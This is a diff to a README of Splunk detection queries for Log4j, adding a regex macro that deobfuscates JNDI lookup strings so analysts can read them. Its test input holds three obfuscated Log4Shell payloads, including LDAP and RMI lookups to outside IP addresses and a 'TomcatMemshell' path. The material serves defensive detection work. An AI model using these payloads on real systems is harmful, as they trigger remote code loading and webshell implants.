@@ -3,6 +3,34 @@ Splunk query's to detect the used Log4j version and detect abuse.
 
 **NOTE**: please change [... INDEX] to the actual index that you have in your enviroment with this data.
 
+## Deobfuscation
+To get something human readable for the obfuscated jndi strings you can use the below rex command. 
+```
+| rex mode=sed field=_raw "s/%24/$/g s/%7B/{/g s/%7D/}/g s/%3A/:/g s/%2F/\//g s/\$\{(lower:|upper:|::-)([^\}]+)\}/\2/g s/\$\{[^-]+-([^\}]+)\}/\1/g"
+| eval output=ltrim(rtrim(output,"}"),"${")
+```
+Example input + output:
+![SED example](/images/log4j_sed.PNG?raw=true "SED example")
+
+You can also create a macro for it with an input so you don't always have to run it against _raw put the below in your `macros.conf`
+```
+[l4s_deobfuscate(1)]
+args = field_name
+definition = | rex mode=sed field=$field_name$ "s/%24/$/g s/%7B/{/g s/%7D/}/g s/%3A/:/g s/%2F/\//g s/\$\{(lower:|upper:|::-)([^\}]+)\}/\2/g s/\$\{[^-]+-([^\}]+)\}/\1/g"\
+| eval output=ltrim(rtrim(output,"}"),"${")
+iseval = 0
+
+```
+And than call it with the field you want to use the command on:
+```
+| makeresults 
+| eval input=split("${${UwucFF:IpK:Xy:-j}n${D:SWE:-d}${kLToJy:gw:J:-i}:l${bUDmaf:gEga:-d}${a:-a}p://127.0.0.1#107.181.1${dYfCs:-8}7.18${FOEmJU:Dr:VihlsA:YiG:aqMdD:-4}${RYEv:jJeg:KKz:Qd:-:}38${CrTGPt:cNNhn:EaEm:-9}${FhjN:M:-/}TomcatBypass/TomcatMemshell1}|${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://188.166.57.35:1389/Binary}|${jn${lower:d}i:l${lower:d}ap://example.%24{lower:c%7Dom:1234/callback}","|")
+| mvexpand input
+| eval output=input
+| `l4s_deobfuscate(output)`
+| fields - _time
+```
+
 ## Find used versions
 ### Stacktraces
 Find the used version based on stacktraces.
